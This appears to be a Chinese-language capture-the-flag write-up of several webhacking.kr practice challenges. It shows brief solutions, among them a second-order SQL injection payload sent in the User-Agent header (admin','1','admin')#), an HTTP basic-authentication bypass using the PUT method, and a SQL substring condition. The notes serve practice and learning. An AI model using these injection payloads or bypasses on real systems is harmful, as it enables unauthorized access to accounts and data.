# WebHacking

-   Online Link: [WebHacking](http://webhacking.kr/challenge/)

## web-01

## web-02

-   检查`index.php`源码，发现`<area shape="rect" coords="851,7,890,65" href="admin/" target="" alt="" />·`
-   访问`/admin`，需要login

## web-03

-   `http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111`

    > 管理页面
    > 注意事项
    > 要小心，不要管理员密码被泄露。
    > 请参考您正在使用它的第一次手动分钟。（手动密码：@ dM1n\_\_nnanual）

## web-08

-   二次注入，需要掌握整个流程
    -   [源码分析](./web_08/index.php)
    -   注入点 `$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");`
    -   此处 agent 是可控的，而且没有针对 ''', ',', '#' 进行防护
-   第一次：`admin','1','admin')#` -> `USER-AGENT done! (0/70)`
-   第二次：`admin` -> `USER-AGENT hi admin`

## web-09

-   Basic access authentication(HTTP 基本认证)
    -   本题针对 GET 以及 POST 方法进行了基本认证，而忽略了PUT方法，由此绕过
-   `substr(id,1,1)in(0x42,0x41)`

## web-10

-   [查看源码](./web_10/code1.html)，其中关键代码
    ```html
    <a id=hackme style="position:relative;left:0;top:0" onclick="this.style.posLeft+=1;if(this.style.posLeft==800)this.href='?go='+this.style.posLeft" onmouseover=this.innerHTML='yOu' onmouseout=this.innerHTML='O'>O</a>
    ```
-   可知需要访问`?go=800`
